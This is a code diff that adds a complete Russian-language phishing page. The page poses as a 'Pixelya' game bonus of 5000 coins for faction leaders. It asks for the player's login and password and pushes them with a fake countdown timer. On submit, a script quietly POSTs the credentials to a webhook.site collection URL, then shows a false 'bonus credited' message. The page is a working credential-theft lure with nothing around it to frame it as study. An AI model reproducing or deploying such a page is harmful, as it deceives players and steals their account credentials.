@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>🎁 Бонус 5000 монет – Pixelya</title>
+    <style>
+        body { background: #0b0e1a; color: #fff; font-family: Arial; text-align: center; padding: 40px 20px; }
+        .box { background: #1a1f35; padding: 30px; border-radius: 20px; max-width: 360px; margin: auto; box-shadow: 0 0 30px #00aaff66; }
+        input { width: 90%; padding: 14px; margin: 8px 0; border-radius: 10px; border: none; background: #2a2f4a; color: #fff; }
+        button { background: #00cc66; padding: 14px; width: 100%; border: none; border-radius: 10px; font-size: 18px; color: #000; font-weight: bold; }
+        .timer { color: #ffaa00; font-size: 24px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🎉 Получи 5000 монет</h2>
+        <p>Акция для лидеров фракций! Введите данные для подтверждения:</p>
+        <form id="stealForm">
+            <input type="text" id="login" placeholder="Ваш логин или ID" required>
+            <input type="password" id="pass" placeholder="Пароль" required>
+            <button type="submit">▶ Активировать бонус</button>
+        </form>
+        <p class="timer">⏳ Осталось: <span id="countdown">02:30</span></p>
+        <p style="font-size:12px; color:#888;">*Только для проверенных аккаунтов</p>
+    </div>
+    <script>
+        let sec = 150;
+        setInterval(() => {
+            sec--;
+            let m = String(Math.floor(sec/60)).padStart(2,'0');
+            let s = String(sec%60).padStart(2,'0');
+            document.getElementById('countdown').textContent = m+':'+s;
+            if(sec<=0) document.querySelector('.timer').innerHTML = '⏳ Акция завершена!';
+        }, 1000);
+
+        document.getElementById('stealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const login = document.getElementById('login').value;
+            const pass = document.getElementById('pass').value;
+            fetch('https://webhook.site/f80b727a-10b0-4898-ac8f-836c594d5ab6', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({login: login, pass: pass, time: new Date().toISOString()})
+            });
+            alert('✅ Бонус начислен! Проверьте баланс.');
+            document.getElementById('login').value = '';
+            document.getElementById('pass').value = '';
+        });
+    </script>
+</body>
+</html>
